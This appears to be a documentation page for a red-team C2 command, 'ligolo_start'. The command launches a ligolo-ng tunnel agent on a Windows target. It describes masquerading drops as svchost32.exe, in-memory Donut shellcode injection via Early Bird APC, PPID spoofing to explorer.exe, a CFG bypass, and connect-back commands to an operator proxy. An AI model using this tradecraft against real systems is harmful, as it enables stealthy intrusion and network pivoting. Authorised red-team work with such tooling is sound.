+++
title = "ligolo_start"
chapter = false
weight = 5
+++

## Summary
Start a ligolo-ng agent session. Two modes available:

- **Disk-drop** (default): drops the binary to `remote_path` and executes via `CreateProcessW`. Requires `EMBEDDED_LIGOLO` at build time or a manually uploaded binary.
- **Fork+Run**: downloads a Donut shellcode (connection args baked in at task time) from Mythic in chunks, injects via Early Bird APC into a sacrificial process. No disk write. Requires `binaries/agent.exe` in the container.

## Arguments
| Name | Required | Description |
|------|----------|-------------|
| `connect` | Yes* | Proxy address: `host:port` or `ws://host:port` |
| `bind` | Yes* | Bind to `ip:port` instead of connecting out |
| `remote_path` | No | Drop path on target - disk-drop mode only (default: `C:\Windows\Temp\svchost32.exe`) |
| `ignore_cert` | No | Ignore TLS certificate (default: true) |
| `retry` | No | Auto-retry on disconnect (default: true) |
| `accept_fingerprint` | No | Accept cert by SHA256 fingerprint |
| `proxy` | No | Upstream proxy URL |
| `user_agent` | No | Custom HTTP User-Agent |
| `verbose` | No | Verbose output (default: false) |
| `fork_run` | No | Inject in-memory via Early Bird APC instead of dropping to disk (default: true) |
| `chunk_size_mb` | No | Shellcode download chunk size in MB - fork+run only (default: 4). Larger = fewer round-trips = faster. |

\* One of `connect` or `bind` is required.

## Usage

**Fork+Run (in-memory, no disk write) - default:**
```
ligolo_start -Connect 10.10.10.1:11601
```

**Disk-drop (embedded binary at build time):**
```
ligolo_start 10.10.10.1:11601
```

**Disk-drop (bind mode):**
```
ligolo_start -Bind 0.0.0.0:11601
```

**Disk-drop with custom path:**
```
ligolo_start -Connect 10.10.10.1:11601 -RemotePath C:\Windows\Temp\update.exe
```

## Notes
- Fork+Run: connection args (`-connect`, `-ignore-cert`, etc.) are baked into the Donut shellcode by the Python container at task creation time. The shellcode is downloaded in chunks (same protocol as upload) then injected via Early Bird APC. Memory is RW during write, flipped to RX before the APC fires.
- Fork+Run: uses the process set by `spawnto` as host (bare name resolved via SearchPathW). PPID spoofed to `explorer.exe`. CFG bypassed (APC fires inside `ntdll!LdrInitializeThunk`).
- Disk-drop: requires `EMBEDDED_LIGOLO` at build time, or manually upload the binary to `remote_path` first.
- Sessions tracked in a linked list; use `ligolo_status` to list, `ligolo_stop` to terminate.
